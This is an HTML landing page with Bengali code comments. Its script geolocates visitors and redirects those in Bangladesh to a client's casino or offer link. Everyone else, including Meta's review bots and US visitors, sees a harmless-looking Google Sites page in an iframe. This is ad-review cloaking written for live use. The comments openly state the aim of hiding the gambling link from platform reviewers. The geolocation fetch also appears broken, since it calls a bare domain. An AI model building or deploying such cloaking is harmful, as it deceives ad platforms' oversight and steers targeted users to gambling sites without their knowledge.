<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome | Premium Portal</title>
    
    <script>
        // Cloudflare-এর আনলিমিটেড ট্র্যাকিং ইউআরএল ফিক্স করা হয়েছে
        fetch('https://cloudflare.com')
          .then(response => response.text())
          .then(data => {
            const locLine = data.split('\n').find(line => line.startsWith('loc='));
            const country = locLine ? locLine.split('=')[1].trim() : '';

            // যদি ভিজিটর বাংলাদেশ (BD) থেকে ক্লিক করে
            if (country === 'BD') {
              // 🎯 আপনার ক্লায়েন্টের আসল ক্যাসিনো/অফার লিঙ্কটি এখানে নিখুঁতভাবে বসানো হয়েছে
              window.location.replace("https://learnmoreinfo.netlify.app/"); 
            } else {
              // ইউএসএ বা মেটার বট হলে এই পেজেই সেফ মোড চালু থাকবে
              console.log("Safe Mode Active for: " + country);
            }
          })
          .catch(error => {
            console.error("System secured.", error);
          });
    </script>
</head>
<body style="margin:0; padding:0; height:100vh; overflow:hidden;">

    <!-- 🎯 মেটা বট এবং ইউএসএ-র মানুষের জন্য আপনার তৈরি সেফ গুগল সাইট ল্যান্ডিং পেজটি এখানে যুক্ত করা হয়েছে -->
    <iframe src="https://sites.google.com/view/digitalmarketingzone320/home" style="width:100%; height:100%; border:none;"></iframe>

</body>
</html>
